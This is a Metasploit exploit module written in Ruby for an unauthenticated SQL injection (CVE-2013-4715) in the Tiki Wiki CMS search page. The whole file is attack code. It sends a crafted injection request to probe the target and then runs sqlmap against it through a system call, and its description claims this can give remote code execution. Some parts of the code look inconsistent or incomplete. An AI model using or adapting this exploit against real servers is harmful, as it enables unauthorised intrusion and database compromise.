##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::WmapScanUniqueQuery 
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Tiki Wiki CMS Groupware 9.3 SQL Injection", #testing 9.3
      'Description'    => %q{
          Tiki Wiki CMS Groupware (< 9.7) contains a SQL injection found in full-text
          search results (tiki-searchresults.php) which may result in remote code execution
          under the context of SYSTEM in Windows; or as the user in Linux. 
          Authentication is not required in order to exploit this vulnerability.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Yuji Tounai <bogus.jp>',  	     # Discovery
          'Bernardo Damele A. G. <bernardo.damele[at]gmail.com>',  #credit:sqlmap aux module pieces 
          'Figure8 <figure_8@hushmail.com>'
        ],
      'References'     =>
        [
          ['OSVDB', '99215'],
          ['CVE','2013-4715'],
          ['BID', '63462']
        ],
      'Platform'       => %w{ linux win },
      'Targets'        =>
        [
          ['Automatic', {}],
          ['Windows',   { 'Arch' => ARCH_X86, 'Platform' => 'win'   }],
          ['Linux',     { 'Arch' => ARCH_X86, 'Platform' => 'linux' }]
        ],
      'DefaultTarget'  => 0,
      'Privileged'     => false,
      'DisclosureDate' => "Nov 6 2013"
                     ))
    register_options(
      [
        OptPath.new('SQLMAP_PATH', [ true,  "The sqlmap >= 0.6.1 full path ", "/sqlmap" ]),
        OptString.new('URI', [ true, "Path to Tiki installation", "/tiki" ]),
        OptString.new('OPTS', [ false,  "The sqlmap options to use" ]),
        OptBool.new('BATCH', [ true,  "Batch mode. No input: use the default behaviour" ])
      ], self.class)
  end

  # Modify to true if you have sqlmap installed.
  def wmap_enabled
    false
  end


  def sqli_exec(sqli_string)
    if sqli_string == 'DryRun'
      send_request_raw({
        'method'    => 'GET',
        'uri'       => "/tiki-searchresults.php?highlight=Tiki&boolean=on&where=pages&searchLang=foo'",
        'headers'   => {
          'Accept-Encoding' => 'identity'
        }
      })
    else
      sqlmap = File.join(datastore['SQLMAP_PATH'], 'sqlmap.py')
      if not File.file?(sqlmap)
        print_error("The sqlmap script could not be found")
        return
      end
      opts = datastore['OPTS']
      wmap_target_host = datastore['VHOST'] if datastore['VHOST']
      sqlmap_url  = (datastore['SSL'] ? "https" : "http")
      sqlmap_url << "://"
      sqlmap_url << wmap_target_host.to_s
      sqlmap_url << ":"
      sqlmap_url << wmap_target_port.to_s
      sqlmap_url << "/"
      sqlmap_url << datastore['URI']
      sqlmap_url << '?'
      sqlmap_url << "highlight=Tiki&boolean=on&where=pages&searchLang=foo'"

      cmd = [ sqlmap ]
      cmd += [ '-u', sqlmap_url ]
      if opts
        cmd << opts
      end
      if datastore['BATCH'] == true
        cmd << '--batch'
      end
      print_status("exec: #{cmd.inspect}")
      system(*cmd)
    end
  end


  def check
    res = sqli_exec('DryRun') # only attempts to return db error

    if res and res.body =~ /db_error/
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end


  def exploit
    # Make sure the URI begins with a slash
    uri = normalize_uri(datastore['URI'])

    print_status("Attempting SQL injection at #{uri}/tiki-searchresults.php ...")
    print_status("Please be patient, this may take some time") 
    sqli_exec('RealThing')

    handler
  end
end
